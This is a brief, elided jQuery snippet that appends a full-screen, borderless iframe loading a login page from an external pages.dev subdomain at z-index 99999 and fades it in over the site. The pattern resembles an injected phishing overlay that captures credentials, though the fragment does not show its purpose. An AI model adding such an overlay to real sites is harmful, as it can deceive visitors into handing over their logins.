...
//		$("body").css("overflow","hidden");
	...
	else
	{
		...
		{
			$('body').append("<iframe class='quicklogin-wrap' src='https://bjezxkl.pages.dev/html/pc/login' frameborder='0' width='100%' height='100%' style='display: none; position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 99999;'></iframe>");
			$('.quicklogin-wrap').fadeIn('fast')
		}
	}
